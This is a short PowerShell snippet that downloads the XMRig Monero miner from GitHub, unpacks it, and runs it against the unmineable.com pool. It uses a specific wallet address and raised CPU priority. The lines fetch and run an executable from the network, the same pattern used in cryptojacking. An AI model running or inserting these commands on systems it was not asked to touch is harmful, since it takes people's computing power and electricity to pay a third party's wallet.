Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip" -OutFile "xmrig.zip"
Expand-Archive xmrig.zip
.\xmrig\xmrig-6.21.3\xmrig.exe -o rx.unmineable.com:3333 -u 8ARyJhJXKiSSoQSMZgoNG87jjNENqwVYaXzdTDFQ1N1JYYKDzrmM8j2Fw1MBTU6bwpGKHut33PKSkPJ1VX71MJrFKq63de5 --cpu-priority 2
